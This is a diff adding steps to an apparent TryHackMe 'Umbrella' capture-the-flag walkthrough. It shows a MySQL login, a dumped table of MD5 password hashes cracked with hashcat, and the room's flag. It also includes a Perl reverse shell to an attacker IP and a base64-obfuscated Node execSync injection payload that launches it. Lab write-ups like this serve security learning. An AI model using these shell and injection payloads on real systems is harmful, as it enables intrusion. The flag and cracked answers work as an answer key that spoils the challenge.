@@ -2,6 +2,8 @@
 
 [TryHackMe | Umbrella](https://tryhackme.com/room/umbrella)
 
+https://0xb0b.gitbook.io/writeups/tryhackme/2024/umbrella
+
 ![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d9b55650-ab19-4288-9392-db8f6f2816db)
 
 ![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/e5c50f35-bf08-44ac-bc7b-074e6aa5bcca)
@@ -214,3 +216,62 @@ curl -s http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest
    ]
 }
 ```
+
+```
+mysql -h umbrella.thm -u root -p
+```
+
+```
+Ng1-f3!Pe7-e5?Nf3xe5
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/68bda6d6-0f38-4447-929c-02af9d361208)
+
++----------+----------------------------------+-------+
+| user     | pass                             | time  |
++----------+----------------------------------+-------+
+| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 |   360 |
+| chris-r  | 0d107d09f5bbe40cade3de5c71e9e9b7 |   420 |
+| jill-v   | d5c0607301ad5d5c1528962a83992ac8 |   564 |
+| barry-b  | 4a04890400b5d7bac101baace5d7e994 | 47893 |
++----------+----------------------------------+-------+
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/e0227ef8-baea-4d8d-a835-0a0de57876a3)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/28f21b9b-b6f1-448d-823b-269dc015de84)
+
+```
+hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt --show
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/445a2487-b95a-4f75-a86d-be03dca1e604)
+
+```
+2ac9cb7dc02b3c0083eb70898e549b63:Password1
+0d107d09f5bbe40cade3de5c71e9e9b7:letmein
+d5c0607301ad5d5c1528962a83992ac8:sunshine1
+4a04890400b5d7bac101baace5d7e994:sandwich
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/ef1a0565-c5d4-4536-ad68-bbf216429765)
+
+```
+THM{d832c0e4cf71312708686124f7a6b25e}
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/2e100b1d-4aa7-4d4c-88a8-2e10b1e3a7cb)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d525cf47-e392-477d-96d2-1a80bbd09474)
+
+```
+perl -e 'use Socket;$i="10.17.44.152";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+```
+
+```
+require('child_process').execSync('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTcuNDQuMTUyIjskcD00NDQ1O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vYmFzaCAtaSIpO307Jw== | base64 -d | bash')
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/2b388510-5e92-4550-a478-140b0e6bedb6)
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/b401e5c5-f1bd-4750-9551-d8c3c51a4630)
+
